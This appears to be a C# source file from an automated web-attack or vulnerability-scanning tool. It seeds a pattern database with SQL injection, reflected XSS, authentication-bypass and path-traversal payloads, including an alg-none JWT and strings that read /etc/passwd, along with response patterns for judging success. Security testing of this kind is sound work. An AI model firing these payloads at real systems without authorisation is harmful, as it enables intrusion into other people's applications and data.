using AttackAgent.Data;
using AttackAgent.Models;
using Serilog;

namespace AttackAgent.Core
{
    /// <summary>
    /// Initializes the attack pattern database with comprehensive attack patterns
    /// </summary>
    public class PatternInitializer
    {
        private readonly AttackPatternDatabase _database;
        private readonly ILogger _logger;

        public PatternInitializer(AttackPatternDatabase database)
        {
            _database = database;
            _logger = Log.ForContext<PatternInitializer>();
        }

        /// <summary>
        /// Initialize the database with comprehensive attack patterns
        /// </summary>
        public async Task InitializePatternsAsync()
        {
            try
            {
                _logger.Information("Initializing attack pattern database...");

                // Initialize SQL Injection patterns
                await InitializeSqlInjectionPatternsAsync();

                // Initialize XSS patterns
                await InitializeXssPatternsAsync();

                // Initialize Authentication Bypass patterns
                await InitializeAuthBypassPatternsAsync();

                // Initialize Input Validation patterns
                await InitializeInputValidationPatternsAsync();

                _logger.Information("Attack pattern database initialization completed");
            }
            catch (Exception ex)
            {
                _logger.Error(ex, "Error initializing attack patterns");
                throw;
            }
        }

        /// <summary>
        /// Initialize SQL Injection attack patterns
        /// </summary>
        private async Task InitializeSqlInjectionPatternsAsync()
        {
            var sqlInjectionPattern = new AttackPattern
            {
                Name = "SQL Injection - Generic",
                Description = "Generic SQL injection patterns for various database systems",
                VulnerabilityType = VulnerabilityType.SqlInjection,
                AttackMode = AttackMode.Aggressive,
                TargetTechnologies = new List<string> { "MySQL", "PostgreSQL", "SQL Server", "Oracle", "SQLite" },
                Payloads = new List<AttackPayload>
                {
                    new AttackPayload
                    {
                        Name = "Basic Union",
                        Payload = "' UNION SELECT NULL, NULL, NULL--",
                        Description = "Basic UNION-based SQL injection",
                        TargetTechnologies = new List<string> { "MySQL", "PostgreSQL", "SQL Server" },
                        ParameterType = "query"
                    },
                    new AttackPayload
                    {
                        Name = "Boolean Blind",
                        Payload = "' OR 1=1--",
                        Description = "Boolean-based blind SQL injection",
                        TargetTechnologies = new List<string> { "MySQL", "PostgreSQL", "SQL Server", "Oracle" },
                        ParameterType = "query"
                    },
                    new AttackPayload
                    {
                        Name = "Time-based Blind",
                        Payload = "'; WAITFOR DELAY '0:0:5'--",
                        Description = "Time-based blind SQL injection for SQL Server",
                        TargetTechnologies = new List<string> { "SQL Server" },
                        ParameterType = "query"
                    },
                    new AttackPayload
                    {
                        Name = "MySQL Sleep",
                        Payload = "'; SELECT SLEEP(5)--",
                        Description = "Time-based blind SQL injection for MySQL",
                        TargetTechnologies = new List<string> { "MySQL" },
                        ParameterType = "query"
                    },
                    new AttackPayload
                    {
                        Name = "PostgreSQL Sleep",
                        Payload = "'; SELECT pg_sleep(5)--",
                        Description = "Time-based blind SQL injection for PostgreSQL",
                        TargetTechnologies = new List<string> { "PostgreSQL" },
                        ParameterType = "query"
                    }
                },
                SuccessIndicators = new List<SuccessIndicator>
                {
                    new SuccessIndicator
                    {
                        Name = "SQL Syntax Error",
                        Description = "SQL syntax error in response",
                        Type = IndicatorType.DatabaseError,
                        Pattern = "SQL syntax",
                        Location = IndicatorLocation.ResponseBody,
                        Confidence = 0.9
                    },
                    new SuccessIndicator
                    {
                        Name = "MySQL Error",
                        Description = "MySQL-specific error message",
                        Type = IndicatorType.DatabaseError,
                        Pattern = "MySQL",
                        Location = IndicatorLocation.ResponseBody,
                        Confidence = 0.95
                    },
                    new SuccessIndicator
                    {
                        Name = "PostgreSQL Error",
                        Description = "PostgreSQL-specific error message",
                        Type = IndicatorType.DatabaseError,
                        Pattern = "PostgreSQL",
                        Location = IndicatorLocation.ResponseBody,
                        Confidence = 0.95
                    },
                    new SuccessIndicator
                    {
                        Name = "SQL Server Error",
                        Description = "SQL Server-specific error message",
                        Type = IndicatorType.DatabaseError,
                        Pattern = "SQL Server",
                        Location = IndicatorLocation.ResponseBody,
                        Confidence = 0.95
                    },
                    new SuccessIndicator
                    {
                        Name = "Oracle Error",
                        Description = "Oracle-specific error message",
                        Type = IndicatorType.DatabaseError,
                        Pattern = "ORA-",
                        Location = IndicatorLocation.ResponseBody,
                        Confidence = 0.95
                    }
                },
                FailureIndicators = new List<FailureIndicator>
                {
                    new FailureIndicator
                    {
                        Name = "No Error Response",
                        Description = "No database error in response",
                        Type = IndicatorType.ResponseBody,
                        Pattern = "success",
                        Location = IndicatorLocation.ResponseBody,
                        Confidence = 0.7
                    }
                },
                RiskLevel = RiskLevel.High,
                Tags = new List<string> { "injection", "database", "critical" }
            };

            await _database.StoreAttackPatternAsync(sqlInjectionPattern);
        }

        /// <summary>
        /// Initialize XSS attack patterns
        /// </summary>
        private async Task InitializeXssPatternsAsync()
        {
            var xssPattern = new AttackPattern
            {
                Name = "Cross-Site Scripting - Reflected",
                Description = "Reflected XSS attack patterns",
                VulnerabilityType = VulnerabilityType.ReflectedXss,
                AttackMode = AttackMode.Aggressive,
                TargetTechnologies = new List<string> { "ASP.NET", "PHP", "Java", "Python", "Node.js" },
                Payloads = new List<AttackPayload>
                {
                    new AttackPayload
                    {
                        Name = "Basic Script Tag",
                        Payload = "<script>alert('XSS')</script>",
                        Description = "Basic XSS with script tag",
                        TargetTechnologies = new List<string> { "ASP.NET", "PHP", "Java", "Python", "Node.js" },
                        ParameterType = "query"
                    },
                    new AttackPayload
                    {
                        Name = "Event Handler",
                        Payload = "<img src=x onerror=alert('XSS')>",
                        Description = "XSS using event handler",
                        TargetTechnologies = new List<string> { "ASP.NET", "PHP", "Java", "Python", "Node.js" },
                        ParameterType = "query"
                    },
                    new AttackPayload
                    {
                        Name = "JavaScript URI",
                        Payload = "javascript:alert('XSS')",
                        Description = "XSS using JavaScript URI",
                        TargetTechnologies = new List<string> { "ASP.NET", "PHP", "Java", "Python", "Node.js" },
                        ParameterType = "query"
                    },
                    new AttackPayload
                    {
                        Name = "Filter Bypass",
                        Payload = "<ScRiPt>alert('XSS')</ScRiPt>",
                        Description = "XSS with case variation to bypass filters",
                        TargetTechnologies = new List<string> { "ASP.NET", "PHP", "Java", "Python", "Node.js" },
                        ParameterType = "query"
                    }
                },
                SuccessIndicators = new List<SuccessIndicator>
                {
                    new SuccessIndicator
                    {
                        Name = "Script Tag Reflected",
                        Description = "Script tag reflected in response",
                        Type = IndicatorType.ResponseBody,
                        Pattern = "<script>",
                        Location = IndicatorLocation.ResponseBody,
                        Confidence = 0.9
                    },
                    new SuccessIndicator
                    {
                        Name = "Event Handler Reflected",
                        Description = "Event handler reflected in response",
                        Type = IndicatorType.ResponseBody,
                        Pattern = "onerror=",
                        Location = IndicatorLocation.ResponseBody,
                        Confidence = 0.9
                    },
                    new SuccessIndicator
                    {
                        Name = "JavaScript URI Reflected",
                        Description = "JavaScript URI reflected in response",
                        Type = IndicatorType.ResponseBody,
                        Pattern = "javascript:",
                        Location = IndicatorLocation.ResponseBody,
                        Confidence = 0.9
                    }
                },
                FailureIndicators = new List<FailureIndicator>
                {
                    new FailureIndicator
                    {
                        Name = "HTML Encoded",
                        Description = "HTML entities encoded in response",
                        Type = IndicatorType.ResponseBody,
                        Pattern = "&lt;script&gt;",
                        Location = IndicatorLocation.ResponseBody,
                        Confidence = 0.8
                    }
                },
                RiskLevel = RiskLevel.Medium,
                Tags = new List<string> { "xss", "client-side", "scripting" }
            };

            await _database.StoreAttackPatternAsync(xssPattern);
        }

        /// <summary>
        /// Initialize Authentication Bypass patterns
        /// </summary>
        private async Task InitializeAuthBypassPatternsAsync()
        {
            var authBypassPattern = new AttackPattern
            {
                Name = "Authentication Bypass - Generic",
                Description = "Generic authentication bypass techniques",
                VulnerabilityType = VulnerabilityType.AuthenticationBypass,
                AttackMode = AttackMode.Aggressive,
                TargetTechnologies = new List<string> { "ASP.NET", "PHP", "Java", "Python", "Node.js" },
                Payloads = new List<AttackPayload>
                {
                    new AttackPayload
                    {
                        Name = "Null Byte Injection",
                        Payload = "admin%00",
                        Description = "Null byte injection in authentication",
                        TargetTechnologies = new List<string> { "PHP", "Java", "Python" },
                        ParameterType = "body"
                    },
                    new AttackPayload
                    {
                        Name = "SQL Injection in Auth",
                        Payload = "admin' OR '1'='1'--",
                        Description = "SQL injection in authentication parameters",
                        TargetTechnologies = new List<string> { "ASP.NET", "PHP", "Java", "Python" },
                        ParameterType = "body"
                    },
                    new AttackPayload
                    {
                        Name = "JWT Manipulation",
                        Payload = "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
                        Description = "JWT token with algorithm set to none",
                        TargetTechnologies = new List<string> { "ASP.NET", "Java", "Python", "Node.js" },
                        ParameterType = "header"
                    },
                    new AttackPayload
                    {
                        Name = "Header Injection",
                        Payload = "admin",
                        Description = "Try to bypass auth with header manipulation",
                        TargetTechnologies = new List<string> { "ASP.NET", "PHP", "Java", "Python", "Node.js" },
                        ParameterType = "header"
                    }
                },
                SuccessIndicators = new List<SuccessIndicator>
                {
                    new SuccessIndicator
                    {
                        Name = "Dashboard Access",
                        Description = "Successful access to dashboard or admin area",
                        Type = IndicatorType.ResponseBody,
                        Pattern = "dashboard",
                        Location = IndicatorLocation.ResponseBody,
                        Confidence = 0.9
                    },
                    new SuccessIndicator
                    {
                        Name = "Admin Panel Access",
                        Description = "Successful access to admin panel",
                        Type = IndicatorType.ResponseBody,
                        Pattern = "admin",
                        Location = IndicatorLocation.ResponseBody,
                        Confidence = 0.9
                    },
                    new SuccessIndicator
                    {
                        Name = "User Profile Access",
                        Description = "Successful access to user profile",
                        Type = IndicatorType.ResponseBody,
                        Pattern = "profile",
                        Location = IndicatorLocation.ResponseBody,
                        Confidence = 0.8
                    }
                },
                FailureIndicators = new List<FailureIndicator>
                {
                    new FailureIndicator
                    {
                        Name = "Login Required",
                        Description = "Login required message",
                        Type = IndicatorType.ResponseBody,
                        Pattern = "login",
                        Location = IndicatorLocation.ResponseBody,
                        Confidence = 0.8
                    },
                    new FailureIndicator
                    {
                        Name = "Unauthorized",
                        Description = "Unauthorized access message",
                        Type = IndicatorType.ResponseCode,
                        Pattern = "401",
                        Location = IndicatorLocation.StatusCode,
                        Confidence = 0.9
                    }
                },
                RiskLevel = RiskLevel.Critical,
                Tags = new List<string> { "authentication", "authorization", "bypass" }
            };

            await _database.StoreAttackPatternAsync(authBypassPattern);
        }

        /// <summary>
        /// Initialize Input Validation patterns
        /// </summary>
        private async Task InitializeInputValidationPatternsAsync()
        {
            var inputValidationPattern = new AttackPattern
            {
                Name = "Input Validation - Path Traversal",
                Description = "Path traversal and directory traversal attacks",
                VulnerabilityType = VulnerabilityType.PathTraversal,
                AttackMode = AttackMode.Aggressive,
                TargetTechnologies = new List<string> { "ASP.NET", "PHP", "Java", "Python", "Node.js" },
                Payloads = new List<AttackPayload>
                {
                    new AttackPayload
                    {
                        Name = "Basic Path Traversal",
                        Payload = "../../../etc/passwd",
                        Description = "Basic path traversal attack",
                        TargetTechnologies = new List<string> { "PHP", "Java", "Python", "Node.js" },
                        ParameterType = "query"
                    },
                    new AttackPayload
                    {
                        Name = "Windows Path Traversal",
                        Payload = "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                        Description = "Windows path traversal attack",
                        TargetTechnologies = new List<string> { "ASP.NET", "PHP", "Java", "Python", "Node.js" },
                        ParameterType = "query"
                    },
                    new AttackPayload
                    {
                        Name = "URL Encoded Path Traversal",
                        Payload = "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                        Description = "URL encoded path traversal",
                        TargetTechnologies = new List<string> { "PHP", "Java", "Python", "Node.js" },
                        ParameterType = "query"
                    }
                },
                SuccessIndicators = new List<SuccessIndicator>
                {
                    new SuccessIndicator
                    {
                        Name = "File Content Exposed",
                        Description = "File content exposed in response",
                        Type = IndicatorType.ResponseBody,
                        Pattern = "root:",
                        Location = IndicatorLocation.ResponseBody,
                        Confidence = 0.95
                    },
                    new SuccessIndicator
                    {
                        Name = "System File Access",
                        Description = "System file content in response",
                        Type = IndicatorType.ResponseBody,
                        Pattern = "bin/bash",
                        Location = IndicatorLocation.ResponseBody,
                        Confidence = 0.95
                    }
                },
                FailureIndicators = new List<FailureIndicator>
                {
                    new FailureIndicator
                    {
                        Name = "File Not Found",
                        Description = "File not found error",
                        Type = IndicatorType.ResponseCode,
                        Pattern = "404",
                        Location = IndicatorLocation.StatusCode,
                        Confidence = 0.8
                    }
                },
                RiskLevel = RiskLevel.High,
                Tags = new List<string> { "path-traversal", "file-access", "directory-traversal" }
            };

            await _database.StoreAttackPatternAsync(inputValidationPattern);
        }
    }
}

